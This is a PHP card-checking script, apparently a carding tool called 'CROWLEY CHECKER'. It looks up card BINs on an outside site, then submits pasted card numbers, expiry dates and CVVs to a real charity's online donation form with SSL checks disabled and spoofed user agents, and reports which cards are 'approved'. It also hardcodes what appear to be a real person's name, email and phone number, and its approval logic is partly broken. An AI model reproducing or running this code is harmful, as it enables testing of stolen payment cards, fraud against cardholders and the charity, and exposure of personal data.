﻿
<?php

	function pregMatch($inicio, $final, $conteudo){
		preg_match('@'.$inicio.'(.*?)'.$final.'@si', $conteudo, $extract);
			return $extract[1];
	}
	function data($objeto){
		$objeto = explode('-', $objeto);
		$objeto = ''.$objeto[2].'/'.$objeto[1].'/'.$objeto[0].'';
		return $objeto;
	}
	function percent($num_amount, $num_total) {
	$count1 = $num_amount / $num_total; 
	$count2 = $count1 * 100; 
	$count = number_format($count2, 0); 
	return $count; 
    }
if($_POST['testar']=="cc"){
	$ccs			= $_POST['ccs'];
	$separador		= $_POST['separador'];
	$id		= $_POST['id'];
	$explode = explode($separador, $ccs);
	if($explode[0][0] == '4'){
		$tipo = 'visa'; //Visa
	}elseif($explode[0][0] == '5'){
		$tipo = 'mastercard'; //MasterCard
	}
	elseif($explode[0][0] == '3'){
		$tipo = 'amex'; //Amex
	}
	elseif($explode[0][0] == '38'){
		$tipo = 'diners'; //Amex
	}
	elseif($explode[0][0] == '63'){
		$tipo = 'elo'; //Amex
	}
	
	if($explode[0][0] == '4'){
		$tipo2 = '<i class="ccs ccs-visa" style="font-size:48px"><span></span></i>'; //Visa
	}elseif($explode[0][0] == '5'){
		$tipo2 = '<i class="ccs ccs-mastercard" style="font-size:48px"><span></span></i>'; //MasterCard
	}
	elseif($explode[0][0] == '3'){
		$tipo2 = '<i class="ccs ccs-amex" style="font-size:48px"><span></span></i>'; //Amex
	}
	elseif($explode[0][0] == '38'){
	$tipo2 = '<i class="ccs ccs-dinersclub" style="font-size:48px"><span></span></i>'; //Amex
	}
	
	$bin = substr($explode[0], 0, 6); // puxa os 6 primeiros digitos da bin
    $data = "listcc=$bin&submit=CHECK+NOW";
	$curl_connection = curl_init();
	curl_setopt($curl_connection, CURLOPT_URL, "http://alltoolug.com/webtools/tool/othertool/bin/");
	curl_setopt($curl_connection, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($curl_connection, CURLOPT_POST, TRUE);
	curl_setopt($curl_connection, CURLOPT_FOLLOWLOCATION, TRUE);
	curl_setopt($curl_connection, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
	curl_setopt($curl_connection, CURLOPT_POSTFIELDS, $data);
	$output = curl_exec($curl_connection); 
    $separator = $output;
	curl_close($curl_connection); // final do curl da bin
	$separator = explode('<td>', $separator);
	$banco = strip_tags($separator[4]);
	$xd = "";
	if($bin[0] == '4'){
		$xd = 'VISA CREDIT ';
	}elseif($bin[0] == '5'){
		$xd = 'MASTERCARD CREDIT ';
	}elseif($bin[0] == '3'){
		$xd = "AMERICAN EXPRESS CREDIT  ";
	}
	$classe = str_replace($xd, "", $separator[5]);
	$pais = strip_tags($separator[6]);
	$bandeira = "";
	if($bin[0] == '3') {
		$bandeira = str_replace( " CREDIT  ", "", $xd);
	} else {
		$bandeira = str_replace( " CREDIT ", "", $xd);
	}
	$a5 = mt_rand(55555, 58555);
	$s1 = substr(str_shuffle(str_repeat("0123456789abcdefghijklmnopqrstuvwxyz-_", 43)), 0, 43);
	$s2 = substr(str_shuffle(str_repeat("0123456789abcdefghijklmnopqrstuvwxyz-_", 43)), 0, 43);
	$numero = $explode[0];
	$mes = $explode[1];
$ano = $explode[2];
if($ano == "2020"){
    $ano = "20";
}
elseif($ano == "20"){
    $ano = "20";
}else{
    $ano = str_replace("20", "", $ano);
}
	$cvv = $explode[3];
    switch (substr($numero, 0, 1)) {
        case '4':
        $typeCard = 1;
        $typeName = "Visa";
        break;
        case '5':
        $typeCard = 2;
        $typeName = "MasterCard";
    break;
    case '3':
    $typeCard = 3;
    $typeName = "Amex";
        break;
    }

switch ($mes) {
    case '1': $mes = '01';
        break;
    case '2': $mes = '02';
        break;
    case '3': $mes = '03';
        break;
    case '4': $mes = '04';
        break;
    case '5': $mes = '05';
        break;
    case '6': $mes = '06';
        break;
    case '7': $mes = '07';
        break;
    case '8': $mes = '08';
        break;
    case '9': $mes = '09';
        break;
}
	
	    
																			$random_valor          = rand(3, 5);
																			$random_valor_centavos = rand(10, 99);
																			$random_email = rand(0000, 9999);
																			$random_account = rand(1000, 9999);

																			
	
    $USERAGENTSTRINGS = array( "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36", "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0","Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0");
    $USERAGENTSTRINGS = $USERAGENTSTRINGS[rand(0, sizeof($USERAGENTSTRINGS) - 1)];
	$proxylist = ''.mt_rand('17', '22').'.'.mt_rand('100', '255').'.'.mt_rand('100', '255').'.'.mt_rand('100', '255').'';
    function value($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
	}
	        $ch = curl_init();                       
            curl_setopt($ch, CURLOPT_URL, 'https://act.autismspeaks.org/site/Donation2');
            curl_setopt($ch, CURLOPT_HEADER, 1);
            curl_setopt($ch, CURLOPT_USERAGENT, $USERAGENTSTRINGS); // RADOM DOS NAVEGADORES
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_COOKIESESSION, false );
            curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded'));
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
            curl_setopt($ch, CURLOPT_VERBOSE, 1);
            curl_setopt($ch, CURLOPT_POST, 0);       
            curl_setopt($ch, CURLOPT_REFERER, 'https://act.autismspeaks.org/site/Donation2');
            curl_setopt($ch, CURLOPT_POSTFIELDS, 'input=&other_occasionsubmit=true&tribute_honoree_first_namename=&tribute_honoree_first_namesubmit_skip=true&tribute_honoree_last_namename=&tribute_honoree_last_namesubmit_skip=true&announcement_radio=E-Card&announcementsubmit=true&tribute_notify_recip_namename=&tribute_notify_recip_namesubmit_skip=true&tribute_notify_recip_street1name=&tribute_notify_recip_street1submit_skip=true&tribute_notify_recip_street2name=&tribute_notify_recip_street2submit_skip=true&tribute_notify_recip_cityname=&tribute_notify_recip_citysubmit_skip=true&tribute_notify_recip_state=&tribute_notify_recip_statesubmit_skip=true&tribute_notify_recip_zipname=&tribute_notify_recip_zipsubmit_skip=true&tribute_notify_recip_country=United+States&tribute_notify_recip_countrysubmit_skip=true&send_ecardsubmit=true&ecard_recpientsname=&ecard_recpientssubmit=true&tribute_ecard_subjectname=&tribute_ecard_subjectsubmit=true&stationery_layout_chooser=true&stationery_layout_id=1222&select_gridsubmit=true&tribute_ecard_messagename=&tribute_ecard_messagesubmit=true&nullsubmit=true&preview_buttonsubmit=true&e_card_copy_sendersubmit=true&responsive_payment_typepay_typeradio=credit&responsive_payment_typepay_typeradiosubmit=true&responsive_payment_typecc_typesubmit=true&responsive_payment_typecc_numbername='.$numero.'&responsive_payment_typecc_numbersubmit=true&responsive_payment_typecc_exp_date_MONTH='.$mes.'&responsive_payment_typecc_exp_date_YEAR='.$ano.'&responsive_payment_typecc_exp_date_DAY=1&responsive_payment_typecc_exp_datesubmit=true&responsive_payment_typecc_cvvname='.$cvv.'&responsive_payment_typecc_cvvsubmit=true&responsive_payment_typesubmit=true&billing_first_namename=CRISTIANE&billing_first_namesubmit=true&billing_last_namename=GONCALVES&billing_last_namesubmit=true&billing_addr_street1name=BAIRRO+CAXIAS&billing_addr_street1submit=true&billing_addr_street2name=&billing_addr_street2submit=true&billing_addr_cityname=ITAOCARA&billing_addr_citysubmit=true&billing_addr_state=FL&billing_addr_statesubmit=true&billing_addr_zipname=28570-000&billing_addr_zipsubmit=true&donor_phonename=8882524258&donor_phonesubmit=true&billing_addr_country=Brazil&billing_addr_countrysubmit=true&donor_email_addressname=Jhonatan_arouca%40outlook.com&donor_email_addresssubmit=true&donor_email_opt_inname=on&donor_email_opt_insubmit=true&pstep_finish=Donate+Now&idb=944435539&df_id=1500&mfc_pref=T&1500.donation=form1');
            $result = curl_exec($ch);         
            curl_close($ch);
			//echo"<br><font color='black'>$result</font>";
		if (strpos($result,'There was an error processing your credit card.') !== false) {
				echo "<center><div class='animated bounceIn alert alert-success cc'><font color='#FFFFFF'>Aprovada | $numero | $mes | $ano | $cvv | VALOR APROVADO [R$] : $random_valor,$random_valor_centavos | $bandeira | $classe | $banco | $pais | # CROWLEY CHECKER</div><font></center>";

			}
			else{
echo "<center><font color='#Green'>Bin | $numero | $mes | $ano | $cvv | $bandeira | $classe | $banco | $pais | @[̲̅м̲̅я̲̅X̲̅ ̲̅C̲̅є̲̅и̲̅т̲̅я̲̅α̲̅L̲̅]</div><font></center>";
			}		
}

?>